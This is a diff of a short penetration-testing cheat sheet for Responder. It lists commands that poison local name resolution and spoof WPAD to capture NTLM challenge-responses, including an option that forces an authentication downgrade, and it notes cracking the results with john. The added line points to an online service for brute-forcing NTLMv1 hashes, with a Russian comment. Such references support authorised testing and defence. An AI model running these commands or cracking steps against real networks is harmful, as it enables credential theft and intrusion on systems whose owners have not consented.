@@ -1,6 +1,7 @@
 responder -I <Iface> #Default conf
 responder -I <Iface> -P -r -v #More chances but might break things
 responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
+https://lookup.ntlmrain.com/   брут хэшей NTLMv1
 responder -I <Iface> --wpad
 responder.py -I <interface> -Pv
 You won't be able to intercept NTLM hashes (normally), but you can easily grab some NTLM challenges and responses that you can crack using for example john option --format=netntlmv2.
